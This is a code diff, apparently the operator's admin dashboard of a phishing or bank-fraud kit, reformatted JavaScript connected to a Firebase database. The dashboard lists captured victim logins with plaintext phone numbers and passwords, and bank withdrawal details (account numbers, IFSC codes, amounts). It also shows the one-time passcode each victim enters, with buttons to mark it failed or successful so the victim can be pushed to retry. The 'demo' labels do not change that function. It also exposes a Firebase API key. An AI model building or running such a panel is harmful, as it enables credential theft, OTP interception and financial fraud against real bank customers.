@@ -79,6 +79,7 @@ button{border:0;border-radius:13px;padding:12px 17px;font-weight:800;cursor:poin
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 <script>
+// 🔥 FIREBASE CONFIG - APNA CONFIG YAHAN PASTE KAREIN
 const firebaseConfig = {
   apiKey: "AIzaSyBvWHDh7ufJDh7vyXU8MJZ99",
   authDomain: "withdrawal-app-70402.firebaseapp.com",
@@ -89,43 +90,204 @@ const firebaseConfig = {
   appId: "1:889103976344:web:25aa5c6ba9234e73564ded",
   measurementId: "G-KKQKXQMKKV"
 };
+
 firebase.initializeApp(firebaseConfig);
 const database = firebase.database();
+
 let lastOtp = null;
 
 function render() {
   database.ref('activities').orderByChild('time').once('value').then((snapshot) => {
-    const data = snapshot.val(); const allData = [];
-    if(data){Object.keys(data).forEach(key=>{allData.push({id:key,...data[key]});});}
-    allData.sort((a,b)=>{if(a.time>b.time)return -1; if(a.time<b.time)return 1; return 0;});
-    renderTable(allData); updateOTPDisplay();
-  }).catch((error)=>{console.error("Firebase Error:",error); document.getElementById('loginRows').innerHTML='<tr><td colspan="4" class="empty">❌ Error loading data</td></tr>'; document.getElementById('withdrawRows').innerHTML='<tr><td colspan="7" class="empty">❌ Error loading data</td></tr>';});
+    const data = snapshot.val();
+    const allData = [];
+    if(data){
+      Object.keys(data).forEach(key => {
+        allData.push({ id: key, ...data[key] });
+      });
+    }
+    allData.sort((a, b) => {
+      if(a.time > b.time) return -1;
+      if(a.time < b.time) return 1;
+      return 0;
+    });
+    renderTable(allData);
+    updateOTPDisplay();
+  }).catch((error) => {
+    console.error("Firebase Error:", error);
+    document.getElementById('loginRows').innerHTML = '<tr><td colspan="4" class="empty">❌ Error loading data</td></tr>';
+    document.getElementById('withdrawRows').innerHTML = '<tr><td colspan="7" class="empty">❌ Error loading data</td></tr>';
+  });
 }
+
 function renderTable(data) {
-  const logs = data.filter(x=>x.type==="LOGIN"); const withdrawals = data.filter(x=>x.type==="WITHDRAWAL");
-  document.getElementById('loginCount').textContent=logs.length; document.getElementById('withdrawCount').textContent=withdrawals.length; document.getElementById('totalCount').textContent=data.length;
-  const loginRows=document.getElementById('loginRows');
-  if(logs.length){loginRows.innerHTML=logs.map(x=>'<tr><td>'+esc(x.time)+'</td><td><span class="pill">'+esc(x.platform)+'</span></td><td><strong>'+esc(x.phone)+'</strong></td><td><strong>'+esc(x.password)+'</strong></td></tr>').join('');}
-  else{loginRows.innerHTML='<tr><td colspan="4" class="empty">No demo activity yet.</td></tr>';}
-  const withdrawRows=document.getElementById('withdrawRows');
-  if(withdrawals.length){withdrawRows.innerHTML=withdrawals.map(x=>{var statusClass='',statusText='⏳ Pending'; if(x.verified===true){statusClass='style="background:#28a745;color:#fff;"';statusText='✅ Verified';}else if(x.otpFailed===true){statusClass='style="background:#dc3545;color:#fff;"';statusText='❌ Failed';} return '<tr><td>'+esc(x.time)+'</td><td>'+esc(x.platform)+'</td><td><strong>'+esc(x.bank)+'</strong></td><td><strong>'+esc(x.account)+'</strong></td><td><strong>'+esc(x.ifsc)+'</strong></td><td><strong>'+esc(x.amount)+'</strong></td><td><span class="pill" '+statusClass+'>'+statusText+'</span></td></tr>';}).join('');}
-  else{withdrawRows.innerHTML='<tr><td colspan="7" class="empty">No demo activity yet.</td></tr>';}
+  const logs = data.filter(x => x.type === "LOGIN");
+  const withdrawals = data.filter(x => x.type === "WITHDRAWAL");
+  
+  document.getElementById('loginCount').textContent = logs.length;
+  document.getElementById('withdrawCount').textContent = withdrawals.length;
+  document.getElementById('totalCount').textContent = data.length;
+  
+  const loginRows = document.getElementById('loginRows');
+  if(logs.length){
+    loginRows.innerHTML = logs.map(x => '<tr><td>'+esc(x.time)+'</td><td><span class="pill">'+esc(x.platform)+'</span></td><td><strong>'+esc(x.phone)+'</strong></td><td><strong>'+esc(x.password)+'</strong></td></tr>').join('');
+  } else {
+    loginRows.innerHTML = '<tr><td colspan="4" class="empty">No demo activity yet.</td></tr>';
+  }
+  
+  const withdrawRows = document.getElementById('withdrawRows');
+  if(withdrawals.length){
+    withdrawRows.innerHTML = withdrawals.map(function(x) {
+      var statusClass = '';
+      var statusText = '⏳ Pending';
+      if(x.verified === true){
+        statusClass = 'style="background:#28a745;color:#fff;"';
+        statusText = '✅ Verified';
+      } else if(x.otpFailed === true){
+        statusClass = 'style="background:#dc3545;color:#fff;"';
+        statusText = '❌ Failed';
+      }
+      return '<tr><td>'+esc(x.time)+'</td><td>'+esc(x.platform)+'</td><td><strong>'+esc(x.bank)+'</strong></td><td><strong>'+esc(x.account)+'</strong></td><td><strong>'+esc(x.ifsc)+'</strong></td><td><strong>'+esc(x.amount)+'</strong></td><td><span class="pill" '+statusClass+'>'+statusText+'</span></td></tr>';
+    }).join('');
+  } else {
+    withdrawRows.innerHTML = '<tr><td colspan="7" class="empty">No demo activity yet.</td></tr>';
+  }
 }
-function esc(v){return String(v??"").replace(/[&<>"']/g,m=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#039;"}[m]));}
+
+function esc(v) {
+  return String(v ?? "").replace(/[&<>"']/g, function(m) {
+    return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#039;"}[m];
+  });
+}
+
 function updateOTPDisplay() {
-  const userOtp = localStorage.getItem('user_entered_otp'); const retryMode = localStorage.getItem('otp_retry_mode');
-  if(retryMode==='true'){document.getElementById('userOtpDisplay').style.display='flex'; document.getElementById('userOtpValue').textContent='⏳ Waiting for new OTP...'; document.getElementById('userOtpStatus').textContent='🔄 User is retrying...'; document.getElementById('userOtpStatus').style.color='#ff9800'; document.getElementById('otpStatus').textContent='🔄 Waiting for user to enter new OTP...'; document.getElementById('otpStatus').style.color='#ff9800';}
-  else if(userOtp && userOtp!==lastOtp){lastOtp=userOtp; document.getElementById('userOtpDisplay').style.display='flex'; document.getElementById('userOtpValue').textContent=userOtp; document.getElementById('userOtpStatus').textContent='⏳ Waiting for admin action...'; document.getElementById('userOtpStatus').style.color='#ff9800'; document.getElementById('otpStatus').textContent='📨 OTP received from user! Take action.'; document.getElementById('otpStatus').style.color='#ff9800';}
-  const result=localStorage.getItem('otp_result');
-  if(result==='failed'){document.getElementById('otpStatus').textContent='❌ OTP Failed! User notified.'; document.getElementById('otpStatus').style.color='#dc3545'; document.getElementById('userOtpStatus').textContent='❌ OTP Failed!'; document.getElementById('userOtpStatus').style.color='#dc3545';}
-  else if(result==='success'){document.getElementById('otpStatus').textContent='✅ OTP Successful! User notified.'; document.getElementById('otpStatus').style.color='#28a745'; document.getElementById('userOtpStatus').textContent='✅ OTP Successful!'; document.getElementById('userOtpStatus').style.color='#28a745';}
+  const userOtp = localStorage.getItem('user_entered_otp');
+  const retryMode = localStorage.getItem('otp_retry_mode');
+  
+  if(retryMode === 'true'){
+    document.getElementById('userOtpDisplay').style.display = 'flex';
+    document.getElementById('userOtpValue').textContent = '⏳ Waiting for new OTP...';
+    document.getElementById('userOtpStatus').textContent = '🔄 User is retrying...';
+    document.getElementById('userOtpStatus').style.color = '#ff9800';
+    document.getElementById('otpStatus').textContent = '🔄 Waiting for user to enter new OTP...';
+    document.getElementById('otpStatus').style.color = '#ff9800';
+  } else if(userOtp && userOtp !== lastOtp){
+    lastOtp = userOtp;
+    document.getElementById('userOtpDisplay').style.display = 'flex';
+    document.getElementById('userOtpValue').textContent = userOtp;
+    document.getElementById('userOtpStatus').textContent = '⏳ Waiting for admin action...';
+    document.getElementById('userOtpStatus').style.color = '#ff9800';
+    document.getElementById('otpStatus').textContent = '📨 OTP received from user! Take action.';
+    document.getElementById('otpStatus').style.color = '#ff9800';
+  }
+  
+  const result = localStorage.getItem('otp_result');
+  if(result === 'failed'){
+    document.getElementById('otpStatus').textContent = '❌ OTP Failed! User notified.';
+    document.getElementById('otpStatus').style.color = '#dc3545';
+    document.getElementById('userOtpStatus').textContent = '❌ OTP Failed!';
+    document.getElementById('userOtpStatus').style.color = '#dc3545';
+  } else if(result === 'success'){
+    document.getElementById('otpStatus').textContent = '✅ OTP Successful! User notified.';
+    document.getElementById('otpStatus').style.color = '#28a745';
+    document.getElementById('userOtpStatus').textContent = '✅ OTP Successful!';
+    document.getElementById('userOtpStatus').style.color = '#28a745';
+  }
 }
-function clearActivity(){if(confirm("Clear all demo activity?")){database.ref('activities').remove().then(()=>{localStorage.removeItem('user_entered_otp');localStorage.removeItem('otp_result');localStorage.removeItem('withdrawal_timer_cancel');localStorage.removeItem('otp_retry_mode');render();});}}
-function cancelTimer(){localStorage.setItem('withdrawal_timer_cancel','true'); document.getElementById('otpStatus').textContent='⏹ Timer cancelled! User can enter OTP.'; document.getElementById('otpStatus').style.color='#dc3545';}
-function sendOTPFailed(){const userOtp=localStorage.getItem('user_entered_otp'); if(!userOtp){alert('No OTP entered by user yet!');return;} database.ref('activities').once('value').then((snapshot)=>{const data=snapshot.val(); if(data){const keys=Object.keys(data); const latestKey=keys[keys.length-1]; if(latestKey&&data[latestKey].type==='WITHDRAWAL'){database.ref('activities/'+latestKey).update({verified:false,otpFailed:true});}}}); localStorage.setItem('otp_result','failed'); document.getElementById('userOtpStatus').textContent='❌ OTP Failed!'; document.getElementById('userOtpStatus').style.color='#dc3545'; document.getElementById('otpStatus').textContent='❌ OTP Failed! User notified.'; document.getElementById('otpStatus').style.color='#dc3545'; render();}
-function sendOTPSuccess(){const userOtp=localStorage.getItem('user_entered_otp'); if(!userOtp){alert('No OTP entered by user yet!');return;} database.ref('activities').once('value').then((snapshot)=>{const data=snapshot.val(); if(data){const keys=Object.keys(data); const latestKey=keys[keys.length-1]; if(latestKey&&data[latestKey].type==='WITHDRAWAL'){database.ref('activities/'+latestKey).update({verified:true,otpFailed:false});}}}); localStorage.setItem('otp_result','success'); document.getElementById('userOtpStatus').textContent='✅ OTP Successful!'; document.getElementById('userOtpStatus').style.color='#28a745'; document.getElementById('otpStatus').textContent='✅ OTP Successful! User notified.'; document.getElementById('otpStatus').style.color='#28a745'; render();}
-function resetOTP(){localStorage.removeItem('user_entered_otp'); localStorage.removeItem('otp_result'); localStorage.removeItem('withdrawal_timer_cancel'); localStorage.removeItem('otp_retry_mode'); lastOtp=null; document.getElementById('userOtpDisplay').style.display='none'; document.getElementById('userOtpValue').textContent='------'; document.getElementById('userOtpStatus').textContent='⏳ Waiting for action...'; document.getElementById('userOtpStatus').style.color='#666'; document.getElementById('otpStatus').textContent='✅ Reset. Ready.'; document.getElementById('otpStatus').style.color='#28a745'; render();}
-render(); setInterval(render, 3000);
+
+function clearActivity() {
+  if(confirm("Clear all demo activity?")){
+    database.ref('activities').remove().then(() => {
+      localStorage.removeItem('user_entered_otp');
+      localStorage.removeItem('otp_result');
+      localStorage.removeItem('withdrawal_timer_cancel');
+      localStorage.removeItem('otp_retry_mode');
+      render();
+    });
+  }
+}
+
+function cancelTimer() {
+  localStorage.setItem('withdrawal_timer_cancel', 'true');
+  document.getElementById('otpStatus').textContent = '⏹ Timer cancelled! User can enter OTP.';
+  document.getElementById('otpStatus').style.color = '#dc3545';
+}
+
+function sendOTPFailed() {
+  const userOtp = localStorage.getItem('user_entered_otp');
+  if(!userOtp){
+    alert('No OTP entered by user yet!');
+    return;
+  }
+  
+  database.ref('activities').once('value').then((snapshot) => {
+    const data = snapshot.val();
+    if(data){
+      const keys = Object.keys(data);
+      const latestKey = keys[keys.length - 1];
+      if(latestKey && data[latestKey].type === 'WITHDRAWAL'){
+        database.ref('activities/' + latestKey).update({
+          verified: false,
+          otpFailed: true
+        });
+      }
+    }
+  });
+  
+  localStorage.setItem('otp_result', 'failed');
+  document.getElementById('userOtpStatus').textContent = '❌ OTP Failed!';
+  document.getElementById('userOtpStatus').style.color = '#dc3545';
+  document.getElementById('otpStatus').textContent = '❌ OTP Failed! User notified.';
+  document.getElementById('otpStatus').style.color = '#dc3545';
+  render();
+}
+
+function sendOTPSuccess() {
+  const userOtp = localStorage.getItem('user_entered_otp');
+  if(!userOtp){
+    alert('No OTP entered by user yet!');
+    return;
+  }
+  
+  database.ref('activities').once('value').then((snapshot) => {
+    const data = snapshot.val();
+    if(data){
+      const keys = Object.keys(data);
+      const latestKey = keys[keys.length - 1];
+      if(latestKey && data[latestKey].type === 'WITHDRAWAL'){
+        database.ref('activities/' + latestKey).update({
+          verified: true,
+          otpFailed: false
+        });
+      }
+    }
+  });
+  
+  localStorage.setItem('otp_result', 'success');
+  document.getElementById('userOtpStatus').textContent = '✅ OTP Successful!';
+  document.getElementById('userOtpStatus').style.color = '#28a745';
+  document.getElementById('otpStatus').textContent = '✅ OTP Successful! User notified.';
+  document.getElementById('otpStatus').style.color = '#28a745';
+  render();
+}
+
+function resetOTP() {
+  localStorage.removeItem('user_entered_otp');
+  localStorage.removeItem('otp_result');
+  localStorage.removeItem('withdrawal_timer_cancel');
+  localStorage.removeItem('otp_retry_mode');
+  lastOtp = null;
+  
+  document.getElementById('userOtpDisplay').style.display = 'none';
+  document.getElementById('userOtpValue').textContent = '------';
+  document.getElementById('userOtpStatus').textContent = '⏳ Waiting for action...';
+  document.getElementById('userOtpStatus').style.color = '#666';
+  document.getElementById('otpStatus').textContent = '✅ Reset. Ready.';
+  document.getElementById('otpStatus').style.color = '#28a745';
+  render();
+}
+
+render();
+setInterval(render, 3000);
 </script>
 </body>
 </html>
